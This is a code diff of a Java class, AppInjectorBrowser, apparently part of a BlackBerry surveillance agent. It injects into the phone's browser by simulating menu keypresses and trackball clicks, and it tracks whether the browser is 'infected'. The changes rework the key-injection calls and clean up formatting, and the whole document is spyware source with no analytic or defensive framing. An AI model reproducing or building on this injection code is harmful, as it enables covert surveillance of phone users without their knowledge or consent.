@@ -2,7 +2,6 @@ package blackberry.agent.url;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
-import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.AppInjectorInterface;
@@ -19,7 +18,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
-    
+
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
@@ -35,9 +34,9 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         }
         return instance;
     }
-    
-    private AppInjectorBrowser(){
-        
+
+    private AppInjectorBrowser() {
+
     }
 
     public boolean injectMenu() {
@@ -57,15 +56,21 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        //KeyInjector.pressKeyCode(Keypad.KEY_MENU);
         Utils.sleep(500);
-        KeyInjector.pressRawKey(menu.toString().charAt(0));
+
+        //if(Device.getInstance().hasAdvancedClick){
+        KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
+        //KeyInjector.pressRawKey(menu.toString().charAt(0));
+        //KeyInjector.pressRawKeyCode(menu.toString().charAt(0));
+        //KeyInjector.pressKeyCode(menu.toString().charAt(0));
         Utils.sleep(500);
-        
-        if(Device.getInstance().hasAdvancedClick){
-            KeyInjector.trackBallClick();
-        }else{
-            KeyInjector.trackBallRawClick();
-        }
+        KeyInjector.trackBallClick();
+        //}else{
+        //   KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        //   Utils.sleep(500);
+        //   KeyInjector.trackBallRawClick();
+        //}
         return true;
     }
 
@@ -78,14 +83,12 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     }
 
-    public boolean isInfected() {        
+    public boolean isInfected() {
         return infected;
     }
 
     public void setInfected() {
         infected = true;
     }
-
-
 
 }
